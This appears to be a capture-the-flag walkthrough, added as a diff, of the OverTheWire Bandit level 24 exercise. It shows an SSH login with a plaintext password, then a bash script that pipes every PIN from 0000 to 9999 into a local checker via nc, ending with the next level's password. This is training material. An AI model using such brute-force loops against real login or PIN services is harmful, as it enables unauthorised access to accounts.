@@ -1,0 +1,56 @@
+ssh bandit24@bandit.labs.overthewire.org -p 2220
+                         _                     _ _ _   
+                        | |__   __ _ _ __   __| (_) |_ 
+                        | '_ \ / _` | '_ \ / _` | | __|
+                        | |_) | (_| | | | | (_| | | |_ 
+                        |_.__/ \__,_|_| |_|\__,_|_|\__|
+                                                       
+bandit24@bandit.labs.overthewire.org's password: VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 
+
+bandit24@bandit:~$ nc localhost 30002
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0000
+Wrong! Please enter the correct pincode. Try again.
+^C
+bandit24@bandit:~$ mkdir /tmp/ra6narok24
+bandit24@bandit:~$ cd /tmp/ra6narok24
+bandit24@bandit:/tmp/ra6narok24$ vim bf.sh
+
+#!/bin/bash
+
+pw=VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
+
+for pin in {0000..9999};
+do      
+        echo "$pw $pin"
+done |  
+nc localhost 30002
+:wq
+
+bandit24@bandit:/tmp/ra6narok24$ ls -l
+total 4
+-rw-rw-r-- 1 bandit24 bandit24 121 May 20 08:27 bf.sh
+bandit24@bandit:/tmp/ra6narok24$ chmod u+x bf.sh
+bandit24@bandit:/tmp/ra6narok24$ ./bf.sh
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Correct!
+The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
+
